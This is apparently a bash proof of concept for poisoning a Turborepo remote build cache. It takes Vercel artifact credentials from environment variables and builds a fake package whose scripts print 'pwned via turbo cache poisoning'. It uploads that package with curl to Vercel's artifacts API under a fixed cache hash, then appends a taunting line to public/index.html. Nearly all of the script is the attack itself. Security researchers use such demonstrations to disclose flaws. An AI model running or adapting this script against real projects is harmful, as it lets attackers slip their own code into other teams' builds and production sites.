#!/usr/bin/env bash
set -u

echo "turbo dry run"
turbo run build --dry-run=json > /tmp/dry.json 2>/dev/null

echo "----PUT----"
API="https://vercel.com/api"
TEAM="$VERCEL_ARTIFACTS_OWNER"
TOKEN="$VERCEL_ARTIFACTS_TOKEN"
HASH="fa7e78dfab68d045"
echo $TEAM

mkdir -p packages/web/dist packages/web/.turbo/turbo-build.log
echo '{"name":"youuu","version":"4.1.0","main":"index.js","scripts":{"build":"echo \"pwned via turbo cache poisoning\""}}' > packages/web/dist/package.json
echo 'console.log("pwned via turbo cache poisoning")' > packages/web/dist/index.js

tar -cf artifact.tar -C packages/web/dist packages/web/.turbo/turbo-build.log 
zstd -f artifact.tar

echo "curl -sS -X PUT $API/v8/artifacts/$HASH?teamId=$TEAM"

curl -sS -X PUT \
  "$API/v8/artifacts/$HASH?teamId=$TEAM" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/octet-stream" \
  -H "x-artifact-duration: 0" \
  --data-binary @artifact.tar.zst \
  -w 'PUT HTTP %{http_code}\n'

mkdir -p public && echo 'go see prod babe -->' >> public/index.html